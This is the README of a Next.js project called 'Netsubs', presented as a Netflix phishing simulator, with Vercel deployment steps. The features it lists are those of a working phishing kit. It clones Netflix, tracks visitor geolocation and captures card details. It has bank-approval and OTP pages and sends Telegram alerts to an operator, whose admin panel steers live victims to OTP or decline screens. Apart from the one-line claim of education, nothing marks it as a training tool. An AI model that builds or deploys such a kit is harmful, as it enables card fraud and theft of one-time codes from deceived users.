# Netsubs - Netflix Phishing Simulator

A fully functional Netflix clone for security testing and phishing education. Built with Next.js 15, Vercel-native, multi-language support, and real-time admin controls.

## What's New

This application has been **migrated to Next.js 15** with full Vercel deployment support. See [MIGRATION_SUMMARY.md](./MIGRATION_SUMMARY.md) for what changed.

## Features

- **Captcha Protection** - 4-digit numeric CAPTCHA before access
- **Multi-Language** - English, French, Spanish (auto-detect by country)
- **Session Tracking** - Real-time visitor tracking with geolocation
- **Admin Dashboard** - Live session management and admin commands
- **OAuth Integration** - Manus OAuth authentication
- **Payment Flow** - Fake payment processing with card capture
- **Bank Approval** - Simulated bank app approval flow
- **OTP Verification** - One-time password verification
- **Telegram Notifications** - Real-time admin alerts
- **Responsive Design** - Works on desktop and mobile

## Quick Start

### Local Development

```bash
# 1. Install dependencies
pnpm install

# 2. Set up environment
cp .env.example .env.local
# Edit .env.local with your settings

# 3. Run database migrations
pnpm db:push

# 4. Start dev server
pnpm dev
```

Visit http://localhost:3000 to test the application.

### Deploy to Vercel

```bash
# 1. Push to GitHub
git add .
git commit -m "Deploy to Vercel"
git push origin main

# 2. Go to vercel.com and import your repository
# 3. Set environment variables in Vercel dashboard
# 4. Click Deploy
```

See [DEPLOYMENT.md](./DEPLOYMENT.md) for detailed instructions.

## Environment Variables

### Required
```
OAUTH_SERVER_URL          # OAuth server URL
VITE_APP_ID              # OAuth app ID
VITE_OAUTH_PORTAL_URL    # OAuth portal URL
OWNER_OPEN_ID            # Owner's OpenID
JWT_SECRET               # Session secret (32+ chars)
DATABASE_URL             # MySQL connection string
NEXT_PUBLIC_APP_URL      # Your app URL
```

### Optional (for S3 file uploads)
```
AWS_ACCESS_KEY_ID        # AWS access key
AWS_SECRET_ACCESS_KEY    # AWS secret key
AWS_S3_BUCKET            # S3 bucket name
AWS_S3_REGION            # AWS region
```

See `.env.example` for all variables.

## Architecture

```
┌─────────────────────────────────────────┐
│         Next.js 15 (App Router)         │
├─────────────────────────────────────────┤
│                                         │
│  Pages (React 19)                       │
│  ├── Captcha Page (/)                   │
│  ├── Login (/login)                     │
│  ├── Payment (/payment)                 │
│  ├── Bank App (/bank-app)               │
│  ├── OTP (/otp)                         │
│  └── Admin (/admin)                     │
│                                         │
│  API Routes (Node.js)                   │
│  ├── tRPC endpoints (/api/trpc)         │
│  └── Session management                 │
│                                         │
│  Middleware                             │
│  └── Captcha guard                      │
│                                         │
├─────────────────────────────────────────┤
│                                         │
│  Database (MySQL)                       │
│  ├── User sessions                      │
│  ├── Visitor data                       │
│  └── Telegram config                    │
│                                         │
└─────────────────────────────────────────┘
```

## Project Structure

```
app/                        # Next.js App Router
├── api/                    # API routes
│   ├── trpc/[trpc]/       # tRPC endpoints
│   └── session-offline/   # Session cleanup
├── lib/
│   ├── contexts/          # React contexts
│   ├── trpc.ts            # tRPC client
│   └── trpc-provider.tsx  # Providers
├── [routes]/page.tsx      # Page routes
└── layout.tsx             # Root layout

server/                     # Backend logic
├── _core/                  # Core services
│   ├── sdk.ts             # OAuth SDK
│   ├── trpc.ts            # tRPC setup
│   ├── context.ts         # tRPC context
│   └── ...
└── routers.ts             # API routers

shared/                     # Shared code
├── const.ts               # Constants
└── ...

middleware.ts              # Edge middleware (captcha guard)
next.config.js            # Next.js config
vercel.json               # Vercel config
```

## Available Routes

### Public
- `/` - Captcha page (entry point)
- `/admin` - Admin dashboard
- `/404` - Not found page

### Protected (require captcha)
- `/login` - Login form
- `/payment` - Payment info form
- `/bank-app` - Bank approval simulation
- `/otp` - OTP entry form
- `/invalid-otp` - OTP error page
- `/declined` - Payment declined page

### API
- `/api/trpc/*` - tRPC endpoints
- `/api/session-offline` - Session cleanup

## Admin Controls

Access the admin dashboard at `/admin` to:
- View live visitor sessions in real-time
- Send commands to specific sessions (redirect to bank/OTP/decline)
- Manage session data
- Configure Telegram bot

## Technology Stack

- **Frontend**: React 19, Tailwind CSS 4, shadcn/ui
- **Framework**: Next.js 15 (App Router)
- **Backend**: Node.js API Routes, tRPC
- **Database**: MySQL with Drizzle ORM
- **Auth**: OAuth + JWT
- **Deployment**: Vercel
- **Styling**: Tailwind CSS 4 with CSS variables

## Security Features

- Captcha protection before access
- JWT session tokens
- HTTP-only secure cookies
- OAuth authentication
- Middleware-based route protection
- SQL injection prevention (parameterized queries)
- CSRF token validation

## Performance

- **Serverless**: Automatic scaling on Vercel
- **Edge Middleware**: Captcha check runs at edge (lower latency)
- **Code Splitting**: Automatic per-route
- **Caching**: Optimized cache headers for static assets
- **Database**: Connection pooling for MySQL

## Troubleshooting

### Development Issues

**Port already in use**
```bash
# Change port
PORT=3001 pnpm dev
```

**Database connection failed**
- Check DATABASE_URL in .env.local
- Verify MySQL server is running
- Test connection: `mysql -u user -p -h host db_name`

**OAuth errors**
- Verify OAUTH_SERVER_URL is correct
- Check VITE_APP_ID matches OAuth app settings

### Deployment Issues

See [DEPLOYMENT.md](./DEPLOYMENT.md) troubleshooting section.

## Documentation

- **[MIGRATION_SUMMARY.md](./MIGRATION_SUMMARY.md)** - What changed in the migration
- **[MIGRATION.md](./MIGRATION.md)** - Detailed technical migration guide
- **[DEPLOYMENT.md](./DEPLOYMENT.md)** - Complete Vercel deployment guide

## Build Commands

```bash
# Development server
pnpm dev

# Production build
pnpm build

# Start production server
pnpm start

# Type checking
pnpm check

# Format code
pnpm format

# Database migration
pnpm db:push
```

## Browser Support

- Chrome/Edge (latest 2 versions)
- Firefox (latest 2 versions)
- Safari (latest 2 versions)
- Mobile browsers (iOS Safari, Chrome)

## License

MIT

## Support

For issues or questions:
1. Check [DEPLOYMENT.md](./DEPLOYMENT.md) for deployment issues
2. Check [MIGRATION.md](./MIGRATION.md) for technical details
3. Check GitHub Issues
4. Contact support@example.com

---

**Ready to deploy?** See [DEPLOYMENT.md](./DEPLOYMENT.md) for step-by-step instructions.
